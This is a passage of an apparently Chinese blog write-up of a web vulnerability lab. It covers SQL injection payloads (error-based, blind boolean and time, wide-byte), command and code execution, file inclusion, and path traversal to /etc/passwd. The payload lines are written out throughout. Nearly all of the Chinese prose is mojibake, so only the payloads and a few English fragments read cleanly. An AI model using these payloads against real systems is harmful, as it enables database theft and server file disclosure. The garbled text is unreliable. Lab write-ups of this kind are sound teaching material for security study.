æ–‡æ¡£è¡¨çš„å­—æ®µåç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°åº”è¯¥æ˜¯åˆæ³•çš„XPATHè·¯å¾„ï¼Œä½¿ç”¨æ–¹æ³•è·Ÿä¸‹é¢çš„ä¸€æ ·ï¼Œå°‘ä¸€ä¸ªå‚æ•°è€Œå·²ï¼Œä¸‹é¢çš„å‡½æ•°åå¥½è®°</p><p>updatexml(1,concat(0x7e,database()),1)ï¼šç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®š xml æ–‡æ¡£è¡¨çš„å­—æ®µåç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°åº”è¯¥æ˜¯åˆæ³•çš„XPATHè·¯å¾„ï¼Œå¦‚æœä¸æ˜¯å°±ä¼šå¼•å‘æŠ¥é”™çš„åŒäº‹å°†ä¼ è¿›å»çš„å‚æ•°è¿›è¡Œè¾“å‡ºï¼Œç¬¬ä¸‰ä¸ªæ˜¯æ–°çš„å€¼,&#x3D;&#x3D;ç¬¬ä¸€ç¬¬äºŒä¸ªå‚æ•°æ²¡æœ‰åµç”¨ï¼Œå…³é”®æ˜¯ä¸­é—´çš„æ•°å€¼ï¼Œä¸­é—´çš„æ•°å€¼ä¹Ÿå¯ä»¥ç”¨è¡¨è¾¾å¼çš„å½¢å¼ï¼Œå‡½æ•°ä¼šæŠŠè¿™ä¸ªè¡¨è¾¾å¼æ‰§è¡Œäº†ç„¶åä»¥æŠ¥é”™çš„å½¢å¼è¿”å›å‡ºæ¥&#x3D;&#x3D;ï¼Œè¿™å°±æ˜¯æŠ¥é”™æ³¨å…¥çš„åŸç†</p></blockquote><p>æäº¤ä¸€ä¸ªç”¨æˆ·ä¸º<code>a</code>å¯†ç ä¸º<code>\</code>åå¯ä»¥åœ¨é¡µé¢ä¸Šçœ‹åˆ°æŠ¥é”™ä¿¡æ¯<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\&#39;),&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)&#39; at line 1</code>ï¼Œæ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,database())) and &#x27;# çˆ†å‡ºæ•°æ®åº“å</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/21/w7ohIf.png"></p><blockquote><p><strong>è¿™é‡Œé‡åˆ°ä¸ªç–‘æƒ‘ï¼Œå½“ç”¨<code>#</code>ä»£æ›¿<code>and &#39;</code>çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œä¹‹åå›æ¥å¡«å‘</strong></p></blockquote><h2 id="â€œdeleteâ€æ³¨å…¥-æŠ¥é”™æ³¨å…¥"><a href="#â€œdeleteâ€æ³¨å…¥-æŠ¥é”™æ³¨å…¥" class="headerlink" title="â€œdeleteâ€æ³¨å…¥(æŠ¥é”™æ³¨å…¥)"></a>â€œdeleteâ€æ³¨å…¥(æŠ¥é”™æ³¨å…¥)</h2><p>ç‚¹åˆ é™¤ï¼ŒæŠ“åŒ…ï¼Œidçš„å€¼å¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,database()))# çˆ†æ•°æ®åº“</span><br></pre></td></tr></table></figure><h2 id="â€œhttp-headerâ€æ³¨å…¥"><a href="#â€œhttp-headerâ€æ³¨å…¥" class="headerlink" title="â€œhttp headerâ€æ³¨å…¥"></a>â€œhttp headerâ€æ³¨å…¥</h2><blockquote><p>è¿™é¢˜æ²¡ææ‡‚ä»€ä¹ˆæ„æ€ï¼Œå»æœäº†ç™¾åº¦</p></blockquote><p>åå°å¼€å‘äººå‘˜ä¸ºäº†éªŒè¯å®¢æˆ·ç«¯å¤´ä¿¡æ¯ï¼Œæ¯”å¦‚å¸¸ç”¨çš„ cookie éªŒè¯ï¼Œæˆ–è€…é€šè¿‡ http è¯·æ±‚å¤´ä¿¡æ¯è·å–å®¢æˆ·ç«¯çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚ useragent ã€accept å­—æ®µç­‰ç­‰ï¼Œä¼šå¯¹å®¢æˆ·ç«¯çš„ http è¯·æ±‚å¤´ä¿¡æ¯è·å–å¹¶ä½¿ç”¨ sql è¿›è¡Œå¤„ç†ï¼Œå¦‚æœæ­¤æ—¶æ²¡æœ‰è¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´åŸºäº http å¤´çš„ sql æ³¨å…¥æ¼æ´</p><p><img src="https://s1.ax1x.com/2020/09/21/w7oqLn.png"></p><p>æŠ“åŒ…ï¼Œé‡æ”¾ï¼Œ<code>User-Agent</code>ã€<code>Accept</code>å’Œ<code>Cookie</code>æ”¹ä¸ºå•å¼•å·éƒ½å‘ç°æœ‰æŠ¥é”™ï¼Œè¿˜æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,database())) and &#x27;#çˆ†æ•°æ®åº“å</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/21/w7ofdP.png"></p><h2 id="å¸ƒå°”ç›²æ³¨-base-on-boolian"><a href="#å¸ƒå°”ç›²æ³¨-base-on-boolian" class="headerlink" title="å¸ƒå°”ç›²æ³¨(base on boolian)"></a>å¸ƒå°”ç›²æ³¨(base on boolian)</h2><p>åˆ¤æ–­æ˜¯å¦æ˜¯å¸ƒå°”æ³¨å…¥ï¼Œ<code>kobe&#39; and 1=1#</code>æ­£å¸¸å›æ˜¾ï¼Œ<code>kobe&#39; and 1=2#</code>æŠ¥é”™</p><p>åˆ¤æ–­æ•°æ®åº“åå­—é•¿åº¦ï¼Œ<code>kobe&#39; and length(database())&gt;0#</code> <code>kobe&#39; and length(database())&lt;8#</code>ï¼ŒäºŒåˆ†æ³•æœ€åç¡®å®š<code>kobe&#39; and length(database())=7#</code></p><p>çˆ†æ•°æ®åº“åå­—ï¼š<code>kobe&#39; and ascii(substr(database(),1,1))&gt;113#</code>ï¼ŒäºŒåˆ†æ³•ç¡®å®šå€¼</p><p>æ‰‹å·¥æ³¨å…¥ä¸ç°å®ï¼Œä¸€èˆ¬æ˜¯å†™è„šæœ¬æ‰¹é‡æ‰“å‡ºæ¥ï¼ŒåŸç†å°±æ˜¯åˆ©ç”¨<code>and</code>åé¢è¯­å¥ç»“åˆé¡µé¢æ˜¯å¦æ­£å¸¸å›æ˜¾æ¥çˆ†ç ´å‡ºæƒ³è¦çš„ä¸œè¥¿</p><h2 id="æ—¶é—´ç›²æ³¨-base-on-time"><a href="#æ—¶é—´ç›²æ³¨-base-on-time" class="headerlink" title="æ—¶é—´ç›²æ³¨(base on time)"></a>æ—¶é—´ç›²æ³¨(base on time)</h2><p>ä¸å¸ƒå°”æ³¨å…¥åŸç†ä¸€æ ·ï¼Œéœ€è¦åˆ©ç”¨<code>sleep()</code>å‡½æ•°ç»“åˆ<code>if</code>æ¡ä»¶è¯­å¥åŠ è‡ªå·±ç¼–å†™è„šæœ¬æ¥çˆ†ç ´æƒ³è¦çš„ä¸œè¥¿ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())=7,sleep(5),1)#</span><br></pre></td></tr></table></figure><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><blockquote><p>è¿™ä¸ªæ³¨å…¥æ˜¯æ²¡æœ‰ç ”ç©¶è¿‡çš„ï¼Œç›´æ¥è´´æ¦‚å¿µå’ŒåŸç†ï¼Œæ–¹ä¾¿ä»¥åå›æ¥çœ‹</p></blockquote><h3 id="æ¶‰åŠåˆ°çš„åŸºæœ¬æ¦‚å¿µ"><a href="#æ¶‰åŠåˆ°çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="æ¶‰åŠåˆ°çš„åŸºæœ¬æ¦‚å¿µ"></a>æ¶‰åŠåˆ°çš„åŸºæœ¬æ¦‚å¿µ</h3><ol><li><p>å­—ç¬¦ã€å­—ç¬¦é›†<br>å­—ç¬¦(character)æ˜¯ç»„æˆå­—ç¬¦é›†(character set)çš„åŸºæœ¬å•ä½ã€‚å¯¹å­—ç¬¦èµ‹äºˆä¸€ä¸ªæ•°å€¼(encoding)æ¥ç¡®å®šè¿™ä¸ªå­—ç¬¦åœ¨è¯¥å­—ç¬¦é›†ä¸­çš„ä½ç½®ã€‚</p></li><li><p>UTF8<br>ç”±äºASCIIè¡¨ç¤ºçš„å­—ç¬¦åªæœ‰128ä¸ªï¼Œå› æ­¤ç½‘ç»œä¸–ç•Œçš„è§„èŒƒæ˜¯ä½¿ç”¨UNICODEç¼–ç ï¼Œä½†æ˜¯ç”¨ASCIIè¡¨ç¤ºçš„å­—ç¬¦ä½¿ç”¨UNICODEå¹¶ä¸é«˜æ•ˆã€‚å› æ­¤å‡ºç°äº†ä¸­é—´æ ¼å¼å­—ç¬¦é›†ï¼Œè¢«ç§°ä¸ºé€šç”¨è½¬æ¢æ ¼å¼ï¼ŒåŠUTF(Universal Transformation Format)ã€‚</p></li><li><p>å®½å­—èŠ‚<br>GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JISç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ã€‚å®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒASCIIå­—ç¬¦(ä¸€å­—èŠ‚)çš„ç°è±¡ï¼Œå³å°†ä¸¤ä¸ªasciiå­—ç¬¦è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªå®½å­—èŠ‚å­—ç¬¦ã€‚</p></li></ol><h3 id="MySQLå­—ç¬¦é›†è½¬æ¢è¿‡ç¨‹"><a href="#MySQLå­—ç¬¦é›†è½¬æ¢è¿‡ç¨‹" class="headerlink" title="MySQLå­—ç¬¦é›†è½¬æ¢è¿‡ç¨‹"></a>MySQLå­—ç¬¦é›†è½¬æ¢è¿‡ç¨‹</h3><ol><li>MySQL Serveræ”¶åˆ°è¯·æ±‚æ—¶å°†è¯·æ±‚æ•°æ®ä»character_set_clientè½¬æ¢ä¸ºcharacter_set_connection</li><li>è¿›è¡Œå†…éƒ¨æ“ä½œå‰å°†è¯·æ±‚æ•°æ®ä»character_set_connectionè½¬æ¢ä¸ºå†…éƒ¨æ“ä½œå­—ç¬¦é›†ï¼Œå…¶ç¡®å®šæ–¹æ³•å¦‚ä¸‹ï¼š<ul><li>ä½¿ç”¨æ¯ä¸ªæ•°æ®å­—æ®µçš„CHARACTER SETè®¾å®šå€¼</li><li>è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®è¡¨çš„DEFAULT CHARACTER SETè®¾å®šå€¼(MySQLæ‰©å±•ï¼ŒéSQLæ ‡å‡†)</li><li>è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®åº“çš„DEFAULT CHARACTER SETè®¾å®šå€¼</li><li>è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨character_set_serverè®¾å®šå€¼</li></ul></li><li>å°†æ“ä½œç»“æœä»å†…éƒ¨æ“ä½œå­—ç¬¦é›†è½¬æ¢ä¸ºcharacter_set_results</li></ol><p>&#x3D;&#x3D;å®½å­—èŠ‚æ³¨å…¥å‘ç”Ÿçš„ä½ç½®å°±æ˜¯PHPå‘é€è¯·æ±‚åˆ°MYSQLæ—¶å­—ç¬¦é›†ä½¿ç”¨character_set_clientè®¾ç½®å€¼è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç &#x3D;&#x3D;</p><h3 id="å®½å­—èŠ‚æ³¨å…¥åŸç†"><a href="#å®½å­—èŠ‚æ³¨å…¥åŸç†" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥åŸç†"></a>å®½å­—èŠ‚æ³¨å…¥åŸç†</h3><p>GBKå ä¸¤ä¸ªå­—èŠ‚</p><p>ASCIIå ä¸€ä¸ªå­—èŠ‚</p><p>PHPç¼–ç ä¸ºGBKï¼Œå‡½æ•°æ‰§è¡Œæ·»åŠ çš„æ˜¯ASCIIç¼–ç ï¼ˆæ·»åŠ çš„ç¬¦å·ä¸ºâ€\â€œ)ï¼ŒMySQLé»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—ç¬¦é›†</p><p>å½“PHPè½¬ä¹‰ï¼ˆå¼€å¯GPCã€ç”¨addslasheså‡½æ•°ï¼Œæˆ–è€…icovç­‰ï¼‰æ—¶ï¼Œå•å¼•å·ä¼šè¢«åŠ ä¸Šåæ–œæ <code>\</code>ï¼Œç»“æœå°±æ˜¯<code>\&#39;</code>ï¼Œåå…­è¿›åˆ¶ç¼–ç ä¸º<code>%5c%27</code>ï¼Œå¦‚æœåœ¨PHPè½¬ç§»å‰ï¼Œå•å¼•å·å‰åŠ ä¸Š<code>%df</code>ï¼Œç»“æœå°±æ˜¯<code>%df%5c%27</code>ï¼Œå…¶ä¸­<code>%df%5c</code>ä¼šè¢«å½“æˆå®½å­—ç¬¦ç¼–ç ï¼Œå˜æˆ<code>ç¸—</code></p><p>ä¹Ÿå°±æ˜¯<code>%df\&#39; </code>&#x3D; <code>%df%5c%27</code>&#x3D;<code>ç¸—&#39;</code>ï¼Œå°±æœ‰äº†å•å¼•å·ï¼Œæ–¹ä¾¿æ³¨å…¥</p><h3 id="è¿™é¢˜çš„payload"><a href="#è¿™é¢˜çš„payload" class="headerlink" title="è¿™é¢˜çš„payload"></a>è¿™é¢˜çš„payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1## å†…å®¹éå†</span><br></pre></td></tr></table></figure><h1 id="RCE-è¿œç¨‹å‘½ä»¤-x2F-ä»£ç æ‰§è¡Œ"><a href="#RCE-è¿œç¨‹å‘½ä»¤-x2F-ä»£ç æ‰§è¡Œ" class="headerlink" title="RCE(è¿œç¨‹å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œ)"></a>RCE(è¿œç¨‹å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œ)</h1><h2 id="æ¦‚è¿°-4"><a href="#æ¦‚è¿°-4" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚<br><strong>è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</strong><br>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£<br>æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Š<br>ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨<br>ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡â€è‡ªåŠ¨åŒ–è¿ç»´å¹³å°â€è¿›è¡Œæ“ä½œã€‚åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´,ä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹,ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„â€æ”¶è·â€<br><strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong><br>åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚<br>å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</p><h2 id="exec-â€œpingâ€"><a href="#exec-â€œpingâ€" class="headerlink" title="exec â€œpingâ€"></a>exec â€œpingâ€</h2><p>ç®¡é“ç¬¦ç›´æ¥æ‹¼æ¥å‘½ä»¤</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210315112536.png"></p><h2 id="exec-â€œevalâ€"><a href="#exec-â€œevalâ€" class="headerlink" title="exec â€œevalâ€"></a>exec â€œevalâ€</h2><p>ç”¨æˆ·è¾“å…¥å‚æ•°ç›´æ¥æ‹¼æ¥åˆ°<code>eval</code>å‡½æ•°çš„å‚æ•°å†…ï¼Œå®ç° RCE </p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210315112655.png"></p><h1 id="Files-Inclusion-æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#Files-Inclusion-æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="Files Inclusion(æ–‡ä»¶åŒ…å«æ¼æ´)"></a>Files Inclusion(æ–‡ä»¶åŒ…å«æ¼æ´)</h1><h2 id="æ¦‚è¿°-5"><a href="#æ¦‚è¿°-5" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼š<br>include(),include_once()<br>require(),require_once()<br>è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚<br>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚æ ¹æ®ä¸åŒçš„é…ç½®ç¯å¢ƒï¼Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š<br><strong>1.æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</strong>ä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº›å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚<br><strong>2.è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</strong>èƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚<br>å› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œå¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚<br>ä½ å¯ä»¥é€šè¿‡â€œFile Inclusionâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</p><h2 id="File-inclusion-local"><a href="#File-inclusion-local" class="headerlink" title="File inclusion(local)"></a>File inclusion(local)</h2><p>å¯ä»¥åŒ…å«ç½‘ç«™ä¸‹ä»»æ„æ–‡ä»¶ï¼Œé…åˆç›®å½•ç©¿è¶Š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210315113230.png"></p><h2 id="File-inclusion-remote"><a href="#File-inclusion-remote" class="headerlink" title="File inclusion(remote)"></a>File inclusion(remote)</h2><p>æœ¬åœ° python èµ·ä¸€ä¸ªå±€åŸŸç½‘æœåŠ¡ï¼Œæ•´ä¸ªæ–‡ä»¶åŒ…å«è¿›å»å°±è¡Œ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210315130335.png"></p><h1 id="Unsafe-file-downloads-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"><a href="#Unsafe-file-downloads-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="Unsafe file downloads(ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½)"></a>Unsafe file downloads(ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½)</h1><h2 id="æ¦‚è¿°-6"><a href="#æ¦‚è¿°-6" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œåå°åœ¨æ”¶åˆ°è¯·æ±‚åä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶responseç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚ å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚<br>æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚<br>æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶æ˜¯ç”±å‰ç«¯ä¼ è¿›æ¥çš„ï¼Œåˆ™ä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ã€‚åˆ‡è®°ï¼šæ‰€æœ‰ä¸å‰ç«¯äº¤äº’çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼</p><h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><p>æŠ“åŒ…æ”¹æ–‡ä»¶åç›®å½•ç©¿è¶Šä¸‰å±‚ä¸‹è½½<code>index.php</code></p><h1 id="Unsafe-file-uploads-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "><a 